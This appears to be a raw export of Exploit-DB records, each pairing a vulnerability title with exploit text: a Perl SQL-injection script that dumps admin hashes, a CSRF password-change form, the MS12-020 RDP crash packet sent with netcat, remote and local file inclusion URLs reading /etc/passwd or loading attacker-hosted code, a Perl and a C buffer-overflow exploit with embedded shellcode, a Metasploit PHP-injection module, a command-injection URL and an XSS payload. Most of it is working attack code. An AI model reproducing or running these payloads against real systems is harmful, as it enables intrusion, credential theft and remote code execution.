2.0.50727;)\r\n"";     $packet.=""Connection: Close\r\n\r\n"";     sendpacketii($packet);      $temp = explode(""Posted by "",$html);     $temp2 = explode(""at "",$temp[1]);     $username = $temp2[0];      $temp = explode(""<td class='main_table_title'>"",$html);     $temp2 = explode(""</td>"",$temp[1]);     $password = $temp2[0];      if($username && $password){ 	 	head(); 	print ""[+] Admin User: "" . $username . ""\r\n"";     	print ""[+] Admin Hash: "" . $password . ""\r\n""; 	footer();      }  	else{head(); print ""[-] Exploit Failed...\r\n""; footer();} } ?>  # milw0rm.com [2007-06-19]",remote,webapps,1
25115,"paFaq beta4 - 'answer.php?offset' SQL Injection source: https://www.securityfocus.com/bid/12582/info   paFaq is reportedly affected by an SQL injection vulnerability. This issue exists because the application fails to properly sanitize user-supplied input before using it in SQL queries.   Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   This vulnerability is reported to affect paFaq beta4; earlier versions may also be affected.   http://www.example.com/index.php?act=Answer&cid=1&id=1&offset='",remote,webapps,1
44675,"Teradek Cube 7.3.6 - Cross-Site Request Forgery <!--  Teradek Cube 7.3.6 CSRF Change Password Exploit   Vendor: Teradek, LLC Product web page: https://www.teradek.com Affected version: Firmware Version: 7.3.6 (build 26850)                   Hardware Version: 1.5                   Teradek Firmware Version 7.3.15   Summary: Cube packs world-class video quality into a rugged, portable chassis for quick IP video deployments at any location. Each encoder and decoder includes HDMI and 3G-SDI I/O, Ethernet / WiFI connectivity, and full duplex IFB.  Desc: The application interface allows users to perform certain actions via HTTP requests without performing any validity checks to verify the requests. This can be exploited to perform certain actions with administrative privileges if a logged-in user visits a malicious web site.  Tested on: lighttpd/1.4.31   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2018-5464 Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2018-5464.php   02.03.2018  -->   <html>   <body>     <form action=""http://127.0.0.1/cgi-bin/system.cgi"" method=""POST"">       <input type=""hidden"" name=""command"" value=""password"" />       <input type=""hidden"" name=""pw1"" value=""P@ssw0rd"" />       <input type=""hidden"" name=""pw2"" value=""P@ssw0rd"" />       <input type=""hidden"" name=""user"" value=""admin"" />       <input type=""hidden"" name=""action"" value=""Change&#32;Password"" />       <input type=""submit"" value=""Submit request"" />     </form>   </body> </html>",remote,webapps,1
18606,"Microsoft Terminal Services - Use-After-Free (MS12-020) #######################################################################                               Luigi Auriemma  Application:  Microsoft Terminal Services / Remote Desktop Services               http://www.microsoft.com               http://msdn.microsoft.com/en-us/library/aa383015(v=vs.85).aspx Versions:     any Windows version before 13 Mar 2012 Platforms:    Windows Bug:          use after free Exploitation: remote, versus server Date:         16 Mar 2012 (found 16 May 2011) Author:       Luigi Auriemma               e-mail: aluigi@autistici.org               web:    aluigi.org  Additional references:  http://www.zerodayinitiative.com/advisories/ZDI-12-044/  http://technet.microsoft.com/en-us/security/bulletin/ms12-020   #######################################################################   1) Introduction 2) Bug 3) The Code 4) Fix   #######################################################################  =============== 1) Introduction ===============   From vendor's homepage: ""The Microsoft Remote Desktop Protocol (RDP) provides remote display and input capabilities over network connections for Windows-based applications running on a server. RDP is designed to support different types of network topologies and multiple LAN protocols.""   #######################################################################  ====== 2) Bug ======   The Remote Desktop Protocol is used by the ""Terminal Services / Remote Desktop Services"" and works at kernel level on port 3389.  There is an use-after-free vulnerability located in the handling of the maxChannelIds field of the T.125 ConnectMCSPDU packet (offset 0x2c of the provided proof-of-concept) when set to a value minor/equal than 5.  The problem happens during the disconnection of the user started with RDPWD!NM_Disconnect while the effect of the possible code execution is visible in termdd!IcaBufferAlloc (or termdd!IcaBufferAllocEx on Windows 7/2008) after termdd!IcaGetPreviousSdLink returns an invalid memory pointer, the following dump is taken from Windows 2003 Server:    f761887c 8bff            mov     edi,edi   f761887e 55              push    ebp   f761887f 8bec            mov     ebp,esp   f7618881 56              push    esi   f7618882 57              push    edi   f7618883 8b7d08          mov     edi,dword ptr [ebp+8]   f7618886 8d47ec          lea     eax,[edi-14h]   f7618889 50              push    eax   f761888a eb09            jmp     termdd!IcaBufferAlloc+0x19 (f7618895)   f761888c 8b4618          mov     eax,dword ptr [esi+18h]                  ; we are here   f761888f 833800          cmp     dword ptr [eax],0                        ; or here   f7618892 7527            jne     termdd!IcaBufferAlloc+0x3f (f76188bb)    ; must jump   f7618894 56              push    esi   f7618895 e878290000      call    termdd!IcaGetPreviousSdLink (f761b212)   ; the new ESI is returned by this function   f761889a 8bf0            mov     esi,eax   f761889c 85f6            test    esi,esi   f761889e 75ec            jne     termdd!IcaBufferAlloc+0x10 (f761888c)   f76188a0 ff751c          push    dword ptr [ebp+1Ch]   f76188a3 ff7518          push    dword ptr [ebp+18h]   f76188a6 ff7514          push    dword ptr [ebp+14h]   f76188a9 ff7510          push    dword ptr [ebp+10h]   f76188ac ff750c          push    dword ptr [ebp+0Ch]   f76188af 57              push    edi   f76188b0 e8b9fcffff      call    termdd!IcaBufferAllocInternal (f761856e)   f76188b5 5f              pop     edi   f76188b6 5e              pop     esi   f76188b7 5d              pop     ebp   f76188b8 c21800          ret     18h   f76188bb 33c0            xor     eax,eax   f76188bd 53              push    ebx   f76188be 8d7e10          lea     edi,[esi+10h]   f76188c1 40              inc     eax   f76188c2 f00fc107        lock xadd dword ptr [edi],eax   f76188c6 ff751c          push    dword ptr [ebp+1Ch]   f76188c9 8b4618          mov     eax,dword ptr [esi+18h]                  ; the same value of before   f76188cc ff7518          push    dword ptr [ebp+18h]   f76188cf ff7514          push    dword ptr [ebp+14h]   f76188d2 ff7510          push    dword ptr [ebp+10h]   f76188d5 ff750c          push    dword ptr [ebp+0Ch]   f76188d8 ff761c          push    dword ptr [esi+1Ch]   f76188db ff10            call    dword ptr [eax]                          ; code execution   f76188dd 8bd8            mov     ebx,eax   f76188df 83c8ff          or      eax,0FFFFFFFFh   f76188e2 f00fc107        lock xadd dword ptr [edi],eax   f76188e6 7506            jne     termdd!IcaBufferAlloc+0x72 (f76188ee)   f76188e8 56              push    esi   f76188e9 e8382f0000      call    termdd!_IcaUnloadSd (f761b826)   f76188ee 8bc3            mov     eax,ebx   f76188f0 5b              pop     ebx   f76188f1 ebc2            jmp     termdd!IcaBufferAlloc+0x39 (f76188b5)    eax=040b0402 ebx=e1492090 ecx=00390080 edx=00000003 esi=040b0402 edi=e1438240   eip=f762888c esp=b832f9d8 ebp=b832f9e0 iopl=0         nv up ei pl nz na po nc   cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010202   termdd!IcaBufferAlloc+0x10:   f762888c 8b4618          mov     eax,dword ptr [esi+18h] ds:0023:040b041a=????????    ChildEBP RetAddr     b8b399e0 b89c1c34 termdd!IcaBufferAlloc+0x10   b8b39a00 b89c1c67 RDPWD!StackBufferAlloc+0x26   b8b39a2c b89a902c RDPWD!MCSDetachUserRequest+0x29   b8b39a40 b89a8b44 RDPWD!NMDetachUserReq+0x14   b8b39a4c b89a9185 RDPWD!NM_Disconnect+0x16   b8b39a58 b89adcb4 RDPWD!SM_Disconnect+0x27   b8b39a68 b89a906d RDPWD!SM_OnConnected+0x70   b8b39a88 b89a8db4 RDPWD!NMAbortConnect+0x23   b8b39ac0 b89a9d88 RDPWD!NM_Connect+0x86   b8b39ae0 b89abcfc RDPWD!SM_Connect+0x112   b8b39b08 b89ac786 RDPWD!WDWConnect+0x368   b8b39b3c b89a6959 RDPWD!WDWConfConnect+0x94   b8b39b70 f762c1c7 RDPWD!WD_Ioctl+0x1227   b8b39b8c f762c5a3 termdd!_IcaCallSd+0x35   b8b39bac f762ca10 termdd!_IcaCallStack+0x55   b8b39bf4 f762abcc termdd!IcaDeviceControlStack+0x414   b8b39c24 f762ad20 termdd!IcaDeviceControl+0x4e   b8b39c3c 8081d5c3 termdd!IcaDispatch+0x12a   b8b39c50 808ed4eb nt!IofCallDriver+0x45   b8b39c64 808ee28d nt!NtWriteFile+0x2943   b8b39d00 808e6dbc nt!NtWriteFile+0x36e5   b8b39d34 80883968 nt!NtDeviceIoControlFile+0x2a   b8b39d64 7c82847c nt!KeReleaseInStackQueuedSpinLockFromDpcLevel+0xb14   b8b39d68 badb0d00 ntdll!_NLG_Notify+0x14  On Windows 2003 that zone of the memory pointed by ESI+18 using the provided proof-of-concept is ever in the range 040b02??-040b04??. The exploitability depends by the possibility of controlling ESI or the content pointed by it (maybe via a form of heap spraying?), indeed in my quick tests this zone sometimes is allocated and others it isn't.  Note that on the post-Vista Windows versions (like 7 and 2008) ""seems"" necessary to have ""Allow connections from computers running any version of Remote Desktop"" for being vulnerable. Anyway I'm not totally sure about this so-called limitation because it looks like dependent by my proof-of-concept only.  The provided proof-of-concept uses the BER integer values set at 32bit (big endian) in case they could be useful for easier debugging.  Additional details about the protocol: http://msdn.microsoft.com/en-us/library/cc240836%28v=prot.10%29.aspx   #######################################################################  =========== 3) The Code ===========   http://aluigi.org/poc/termdd_1.dat https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/18606.dat    nc SERVER 3389 < termdd_1.dat  resend it multiple times in case of no results and note that this is just a simple proof-of-concept packet to quickly test the bug so it's not optimized at all.   #######################################################################  ====== 4) Fix ======   http://technet.microsoft.com/en-us/security/bulletin/ms12-020   #######################################################################",remote,dos,1
5182,Portail Web PHP 2.5.1.1 - Multiple Inclusion Vulnerabilities ### Portail Web Php <= 2.5.1.1 Multiple Remote/Local File Inclusion Vulnerabilities ### http://surfnet.dl.sourceforge.net/sourceforge/portail-web-php/PwP2.5.1.1.rar ### POC : ### I- Remote File Inclusion ### /PwP2.5.1.1/template/Vert/index.php?site_path=http://localhost/020.txt ### /PwP2.5.1.1/template/Noir/index.php?site_path=http://localhost/020.txt ### /PwP2.5.1.1/template/Bleu/index.php?site_path=http://localhost/020.txt ### II- Local File Inclusion ### /PwP2.5.1.1/?page=../../../../../../../../etc/passwd ### I'm Tryagi - Tryag.Cc/cc - Mahmood_ali  :)   # milw0rm.com [2008-02-24],remote,webapps,1
2122,"ME Download System 1.3 - 'header.php' Remote File Inclusion +-------------------------------------------------------------------- + + ME Download System 1.3 Remote File Inclusion + +-------------------------------------------------------------------- + + Affected Software .: ME Download System 1.3 + Venedor ...........: http://www.ehmig.net/ + Class .............: Remote File Inclusion + Risk ..............: high (Remote File Execution) + Found by ..........: Philipp Niedziela + Original advisory .: http://www.bb-pcsecurity.de/sicherheit_282.htm + Contact ...........: webmaster[at]bb-pcsecurity[.]de + Affected Files ....: templates/header.php + +-------------------------------------------------------------------- + + Code of /templates/header.php: + + ..... + <?php + include($Vb8878b936c2bd8ae0cab.'/settings_style.php'); + ..... + +-------------------------------------------------------------------- + + $Vb8878b936c2bd8ae0cab is not properly sanitized before being used + +-------------------------------------------------------------------- + + Solution: + Include config-File in header.php: + +-------------------------------------------------------------------- + + PoC: + http://[target]/templates/header.php?$Vb8878b936c2bd8ae0cab=http://evilsite.com?cmd=ls + +-------------------------------------------------------------------- + + Notice: + Maybe there are more RFI-Vulns in other files, but it's very hard + to read this code. + + Venedor has been contacted, but I didn't received any answer. + +-------------------------------------------------------------------- + + Greets: + Krini Gonzales + +-------------------------[ E O F ]----------------------------------  # milw0rm.com [2006-08-07]",remote,webapps,1
8410,"RM Downloader 3.0.0.9 - '.m3u' Universal Stack Overflow #!/usr/bin/perl # RM Downloader Version 3.0.0.9 .m3u Universal Stack Overflow Exploit # Disoverd By Cyber-Zone # Exploited By Stack my $Header = ""#EXTM3U\n""; my $shellcode = ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"". ""\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"". ""\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"". ""\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"". ""\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44"". ""\x42\x30\x42\x50\x42\x30\x4b\x48\x45\x54\x4e\x43\x4b\x38\x4e\x47"". ""\x45\x50\x4a\x57\x41\x30\x4f\x4e\x4b\x58\x4f\x54\x4a\x41\x4b\x38"". ""\x4f\x45\x42\x42\x41\x50\x4b\x4e\x49\x44\x4b\x38\x46\x33\x4b\x48"". ""\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x59\x4e\x4a\x46\x58\x42\x4c"". ""\x46\x57\x47\x30\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"". ""\x46\x4f\x4b\x53\x46\x55\x46\x32\x46\x50\x45\x47\x45\x4e\x4b\x58"". ""\x4f\x45\x46\x52\x41\x50\x4b\x4e\x48\x56\x4b\x58\x4e\x50\x4b\x44"". ""\x4b\x48\x4f\x55\x4e\x41\x41\x30\x4b\x4e\x4b\x58\x4e\x41\x4b\x38"". ""\x41\x50\x4b\x4e\x49\x48\x4e\x45\x46\x32\x46\x50\x43\x4c\x41\x33"". ""\x42\x4c\x46\x46\x4b\x38\x42\x44\x42\x53\x45\x38\x42\x4c\x4a\x47"". ""\x4e\x30\x4b\x48\x42\x44\x4e\x50\x4b\x58\x42\x37\x4e\x51\x4d\x4a"". ""\x4b\x48\x4a\x36\x4a\x30\x4b\x4e\x49\x50\x4b\x38\x42\x58\x42\x4b"". ""\x42\x50\x42\x50\x42\x50\x4b\x38\x4a\x36\x4e\x43\x4f\x45\x41\x53"". ""\x48\x4f\x42\x46\x48\x35\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x57"". ""\x42\x45\x4a\x36\x42\x4f\x4c\x38\x46\x30\x4f\x35\x4a\x46\x4a\x39"". ""\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x46\x41\x46"". ""\x4e\x46\x43\x36\x42\x50\x5a""; my $ex=""http://"".""A"" x 26117; my $ret=""\x17\x48\xF8\x01""; # Universall Ret Adress and if you want Test it under WinSP2 EN/FR use this >>       # ""\x5D\x38\x82\x7C""; my $nop=""\x90"" x 20;  open(MYFILE,'>>RM-Downloader.m3u'); print MYFILE $Header.$ex.$ret.$nop.$shellcode; close(MYFILE);  # milw0rm.com [2009-04-13]",local,local,1
13918,"Spring Framework - Arbitrary code Execution CVE-2010-1622: Spring Framework execution of arbitrary code  Severity: Critical  Vendor: SpringSource, a division of VMware  Versions Affected: 3.0.0 to 3.0.2 2.5.0 to 2.5.6.SEC01 (community releases) 2.5.0 to 2.5.7 (subscription customers)  Earlier versions may also be affected  Description: The Spring Framework provides a mechanism to use client provided data to update the properties of an object. This  mechanism allows an attacker to modify the properties of the class loader used to load the object (via  'class.classloader'). This can lead to arbitrary command execution since, for example, an attacker can modify the URLs  used by the class loader to point to locations controlled by the attacker.  Example: This example is based on a Spring application running on Apache Tomcat. 1. Attacker creates attack.jar and makes it available via an HTTP URL. This jar has to contain following:  - META-INF/spring-form.tld - defining spring form tags and specifying that they are implemented as tag files and not  classes;  - tag files in META-INF/tags/ containing tag definition (arbitrary Java code).  2. Attacker then submits HTTP request to a form controller with the following HTTP parameter:  class.classLoader.URLs[0]=jar:http://attacker/attack.jar!/ At this point the zeroth element of the WebappClassLoader's  repositoryURLs property will be overwritten with attacker's URL.  3. Later on, org.apache.jasper.compiler.TldLocationsCache.scanJars() will use WebappClassLoader's URLs to resolve tag  libraries and all tag files specified in TLD will be resolved against attacker-controller jar (HTTP retrieval of the  jar file is performed by the URL class).  Mitigation: All users may mitigate this issue by upgrading to 3.0.3 Community users of 2.5.x and earlier may also mitigate this issue by upgrading 2.5.6.SEC02 Subscription users of 2.5.x and earlier may also mitigate this issue by upgrading 2.5.6.SEC02 or 2.5.7.SR01  Credit: The issue was discovered by Meder Kydyraliev, Google Security Team  References: [1] http://www.springsource.com/security/spring-framework",remote,webapps,1
24057,"OpenBB 1.0.x - 'member.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/10214/info       It has been reported that OpenBB is affected by multiple input validation vulnerabilities. These issues are due to a failure of the application to properly sanitize user supplied user input.       The SQL issues may allow a remote attacker to manipulate query logic, potentially leading to unauthorized access to sensitive information such as the administrator password hash or corruption of database data. SQL injection attacks may also potentially be used to exploit latent vulnerabilities in the underlying database implementation.       The cross-site scripting issues could permit a remote attacker to create a malicious URI link that includes hostile HTML and script code. If this link were followed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials or other attacks.  http://www.example.com/member.php?action=list&page=1&sortorder=[SQL] http://www.example.com/member.php?action=list&page=1&sortorder=username&perpage=[SQL] http://www.example.com/member.php?action=passwdsend&resetid=blah&id=2[SQL]",remote,webapps,1
18934,"WeBid - 'converter.php' Remote PHP Code Injection (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpClient  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'WeBid converter.php Remote PHP Code Injection', 			'Description'    => %q{ 					This module exploits a vulnerability found in WeBid version 1.0.2. 				By abusing the converter.php file, a malicious user can inject PHP code 				in the includes/currencies.php script without any authentication, which 				results in arbitrary code execution. 			}, 			'Author'         => [ 				'EgiX', # Vulnerability Discovery, PoC 				'juan vazquez' # Metasploit module 			], 			'License'        => MSF_LICENSE, 			'References'     => 				[ 					[ 'OSVDB', '73609' ], 					[ 'EDB', '17487' ] 				], 			'Version'        => '$Revision: $', 			'Privileged'     => false, 			'Platform'       => ['php'], 			'Arch'           => ARCH_PHP, 			'Payload'        => 				{ 				}, 			'DisclosureDate' => 'Jul 05 2011', 			'Targets'        => 				[ 					[ 'WeBid 1.0.2 / Ubuntu', {} ] 				], 			'DefaultTarget' => 0 			))  			register_options( 				[ 					OptString.new('TARGETURI', [true, 'The base path to WeBid', '/WeBid']) 				], self.class 			)  	end  	def check 		uri = target_uri.path 		uri << '/' if uri[-1,1] != '/'  		res = send_request_cgi({ 			'method' => 'GET', 			'uri'    => uri + ""docs/changes.txt"" 		})  		if res and res.code == 200 and res.body =~ /1\.0\.2 \- 17\/01\/11/ 			return Exploit::CheckCode::Appears 		end  		res = send_request_cgi({ 			'method' => 'GET', 			'uri'    => uri + ""converter.php"" 		})  		if res and res.code == 200 and res.body =~ /WeBId.*CURRENCY CONVERTER/ 			return Exploit::CheckCode::Detected 		end  		return Exploit::CheckCode::Safe  	end  	def on_new_session(client)  		if client.type != ""meterpreter"" 			print_error(""NOTE: you must use a meterpreter payload in order to automatically cleanup."") 			print_error(""The currencies.php won't be restored automatically."") 			return 		end  		# stdapi must be loaded before we can use fs.file 		client.core.use(""stdapi"") if not client.ext.aliases.include?(""stdapi"")  		# Original currencies.php file 		currencies_php = <<-eof 			<?php 			$conversionarray[] = '1265375103'; 			$conversionarray[] = array( 				array('from' => 'GBP', 'to' => 'AED', 'rate' => '') 			); 			?> 		eof 		currencies_php = currencies_php.gsub(/^\t\t\t/, '')  		pwd = client.fs.dir.pwd 		print_status(""Searching currencies.php file from #{pwd}"")  		res = client.fs.file.search(nil, ""currencies.php"", true, -1) 		res.each do |hit| 			filename = ""#{hit['path']}/#{hit['name']}"" 			print_status(""Restoring #{filename}"") 			client.fs.file.rm(filename) 			fd = client.fs.file.new(filename, ""wb"") 			fd.write(currencies_php) 			fd.close 		end  		print_status(""Cleanup finished"")  	end  	def exploit  		uri = target_uri.path 		uri << '/' if uri[-1,1] != '/' 		peer = ""#{rhost}:#{rport}""  		stub = ""\0'));#{payload.encoded}?>""  		print_status(""#{peer} - Injecting the PHP payload"")  		response = send_request_cgi({ 			'uri' => uri + ""converter.php"", 			'method' => ""POST"", 			'vars_post' => { 				""action"" => ""convert"", 				""from"" => ""USD"", 				""to"" => stub 			} 		})  		if response and response.code != 200 			print_error(""Server returned non-200 status code (#{response.code})"") 			return 		end  		print_status(""#{peer} - Executing the PHP payload"")  		timeout = 0.01 		response = send_request_cgi({ 				'uri' => uri + ""includes/currencies.php"", 				'method' => ""GET"", 				'headers' => { 						'Connection' => ""close"", 					} 				}, timeout)  		if response and response.code != 200 			print_error(""Server returned non-200 status code (#{response.code})"") 		end  		handler 	end end",remote,webapps,1
24463,Cool PDF Reader 3.0.2.256 - Buffer Overflow # Exploit Title: Cool PDF Reader 3.0.2.256 buffer overflow # Vulnerability Disclosed to US-CERT by Chris Gabriel: 11-20-2012 # Emailed vendor: 12-4-2012 # Francis Provencher discovered vulnerability and reported to Secunia: 12-19-2012 # Vulnerability Discovery: Francis Provencher (Protek Research Lab's) @ProtekResearch # Vulnerability Discovery: Chris Gabriel # Exploit Author: Chris Gabriel # Vendor Homepage: http://www.pdf2exe.com/reader.html # Version: CoolPDF 3.0.2.256  # Tested on: Windows XP SP3 # CVE: CVE-2012-4914 # Reference: http://www.protekresearchlab.com/index.php?option=com_content&view=article&id=70&Itemid=70 # Reference: http://secunia.com/advisories/51602  PoC:  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/24463.py,local,dos,1
12788,"Marketing Web Design - Multiple Vulnerabilities ======================================================================= # Marketing Web Design Multiple Vulnerabilities ======================================================================= 1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0 0 _ __ __ __ 1 1 /' \ __ /'__`\ /\ \__ /'__`\ 0 0 /\_, \ ___ /\_\/\_\ \ \ ___\ \ ,_\/\ \/\ \ _ ___ 1 1 \/_/\ \ /' _ `\ \/\ \/_/_\_<_ /'___\ \ \/\ \ \ \ \/\`'__\ 0 0 \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/ 1 1 \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\ 0 0 \/_/\/_/\/_/\ \_\ \/___/ \/____/ \/__/ \/___/ \/_/ 1 1 \ \____/ >> Exploit database separated by exploit 0 0 \/___/ type (local, remote, DoS, etc.) 1 1 1 0 [+] Site : Inj3ct0r.com 0 1 [+] Support e-mail : submit[at]inj3ct0r.com 1 0 0 1 #################################### 1 0 I'm XroGuE member from Inj3ct0r Team 1 1 #################################### 0 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1  ######################################################################## # Name: Marketing Web Design Multiple Vulnerabilities # Vendor: http://www.marketingwebdesign.net # Date: 2010-05-29 # Author: XroGuE # Thanks to: Inj3ct0r.com,Exploit-DB.com,SecurityReason.com,Hack0wn.com ! # Contact: Xrogue_p3rsi4n_hack3r[at]Hotmail[Dot]com # Home: (-_+) ########################################################################  [+] Dork: intext:""Marketing Web Design - Posicionamiento en Buscadores""   [+] Vulnerability Page: All Pages :))  ########################################################################  [+] SQL InjecTion Vulnerability:  [+] Demo: http://server/verfoto.php?id=1+and+1=1 [and+1=2] http://www.hoopstats.com.ar/ver-noticia.php?id=-9999+and+1=2+union select 1,version(),3,4,5,6,7,8,9--   ########################################################################  [+] HTML InjecTion Vulnerability:  [+] Demo: http://server/verfoto.php?id=<marquee><font color=Blue size=15>XroGuE</font></marquee> http://server/ver-noticia.php?id=<marquee><font color=Blue size=15>XroGuE</font></marquee>  ########################################################################  [+] XSS InjecTion Vulnerability:  [+] Demo: http://server/verfoto.php?id= http://server/ver-noticia.php?id=  ########################################################################",remote,webapps,1
9099,"Universe CMS 1.0.6 - 'vnews.php?id' SQL Injection #!/usr/bin/perl -w # Universe CMS 1.0.6 (id) Remote SQL Injection Exploit # Demo : http://www.universe.uni.org.pl # Download : http://www.universe.uni.org.pl/upload/universecms106.rar # Found by : Mr.tro0oqy <Yemeni ana> # E-mail : t.4@windowslive.com # special thank for my teacher ""Stack"" ######################################## system(""color e""); print ""\t\t0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0\n\n""; print ""\t\t0  Universe CMS 1.0.6 (id) Remote SQL Injection Exploit   0\n\n""; print ""\t\t0                       by Mr.tro0oqy                     0\n\n""; print ""\t\t0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0-0\n\n""; use LWP::UserAgent; die ""Example: perl $0 http://target.com/path \n"" unless @ARGV; $user=""login""; $pass=""password""; $tab=""uni_users""; $b = LWP::UserAgent->new() or die ""error\n""; $b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');  $host = $ARGV[0] . ""/vnews.php?id=-1+union+select+1,2,3,4,concat(CHAR(60,117,115,101,114,62),"".$user."",CHAR(60,117,115,101,114,62),CHAR(60,112,97,115,115,62),"".$pass."",CHAR(60,112,97,115,115,62)),6+from+"".$tab.""&print=1""; $res = $b->request(HTTP::Request->new(GET=>$host)); $answer = $res->content; if ($answer =~ /<user>(.*?)<user>/){         print ""\ loading .....\n"";         print ""\n[+] Admin User : $1""; } if ($answer =~/<pass>(.*?)<pass>/) { print ""\n[+] Admin Hash : $1\n\n""; print ""\t\t#   %100   #\n\n"";}  else { print ""\n[-] Exploit Failed...\n""; }  # milw0rm.com [2009-07-09]",remote,webapps,1
21059,"Solaris 8 - x86 xlock Heap Overflow // source: https://www.securityfocus.com/bid/3160/info   Xlock is a utility for locking X-windows displays. It is installed setuid root because it uses the user's password to authorize access to the display when it is locked.   The version of xlock that ships with Solaris as part of OpenWindows contains a heap overflow in it's handling of an environment variable.   Local attackers may be able to execute arbitrary code with effective privileges of xlock.   /*  *  sol_x86_xlockex.c - Proof of Concept Code for xlock heap overflow bug.  *  Copyright (c) 2001 - Nsfocus.com  *  *  Tested in Solaris 8 x86.  *  *  DISCLAIMS:  *  This  is a proof of concept code.  This code is for test purpose   *  only and should not be run against any host without permission from   *  the system administrator.  *   *  NSFOCUS Security Team <security@nsfocus.com>  *  http://www.nsfocus.com  */   #include <stdio.h> #include <stdlib.h> #include <unistd.h> #include <strings.h> #include <sys/types.h>  #define RETLOC  0x080463c8  /* default retrun address location (Solaris 8 x86) */ #define SP      0x08047ffc  /* default ""bottom"" stack address (Solaris 8 x86) */  #define VULPROG ""/usr/openwin/bin/xlock""  char            shellcode[] =            ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""  ""\xeb\x28\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"" ""\x8b\xec\x83\xec\x64\x33\xd2\xc6\x45\xce\x9a\x89"" ""\x55\xcf\x89\x55\xd3\xc6\x45\xd3\x07\xc6\x45\xd5"" ""\xc3\x89\x55\xfc\x83\xed\x32\x33\xc0\x50\x50\xb0"" ""\xca\xff\xd5\x83\xc4\x08\x31\xc0\x50\x68\x2f\x2f"" ""\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89"" ""\xe2\x50\x52\x53\xb0\x3b\xff\xd5"";  int  main(int argc, char **argv) {         char            buf[2048], fake_chunk[48];         long            retaddr, sp_addr = SP;         char           *arg[24], *env[24];         long            retloc = RETLOC;         unsigned int   *ptr;         char            ev1[]=""XUSERFILESEARCHPATH="";         long            ev1_len;         long            overbuflen = 1024;                  if (argc > 1) /* adjust retloc */                 retloc += atoi(argv[1]);          bzero(buf, sizeof(buf));         ev1_len = strlen(ev1);         memcpy(buf, ev1, ev1_len);         memset(buf + ev1_len, 'A', overbuflen + sizeof(fake_chunk));          arg[0] = VULPROG;         arg[1] = NULL;          env[0] = shellcode;     /* put shellcode in env */         env[1] = buf;           /* put overflow environ */         env[2] = NULL;          /* end of env */                  /* get the not exact shellcode address :) */         retaddr = sp_addr - strlen(VULPROG) - 1                           - strlen(""i86pc"") - 1                            - strlen(buf) - 1                           - strlen(shellcode) - 1;          printf(""Using RET address = 0x%lx\n"", retaddr);         printf(""Using retloc = 0x%lx \n"", retloc);          ptr = (unsigned int *) fake_chunk;         memset(fake_chunk, '\xff', sizeof(fake_chunk));         *(ptr + 0) = 0xfffffff9;         *(ptr + 2) = retaddr;         *(ptr + 8) = retloc - 8;          memcpy(buf + ev1_len + overbuflen, fake_chunk, sizeof(fake_chunk));          execve(VULPROG, arg, env);         perror(""execle"");         return(1); }  /* End of main */",local,local,1
25817,JamMail 1.8 - Jammail.pl Arbitrary Command Execution source: https://www.securityfocus.com/bid/13937/info  JamMail is prone to a remote arbitrary command execution vulnerability.  This vulnerability may allow an attacker to supply arbitrary commands through the 'jammail.pl' script.  This can lead to various attacks including unauthorized access to an affected computer.  JamMail 1.8 is affected by this issue.   http://www.example.com/cgi-bin/jammail.pl?job=showoldmail&mail=|command|,remote,webapps,1
26183,"NEPHP 3.0.4 - 'browse.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/14626/info  nePHP is prone to a cross-site scripting vulnerability. This issue is due to a lack of sanitization of user-supplied input.  This vulnerability will allow a malicious user to perform attacks on an unsuspecting user in the context of the site hosting the affected application.  This can lead to the theft of cookie-based authentication credentials, as well as other attacks.   http://www.example.com/nephp/browse.php?mod=find&keywords='%3E%3Cscript%3Ealert('test');%3C/script%3E",remote,webapps,1
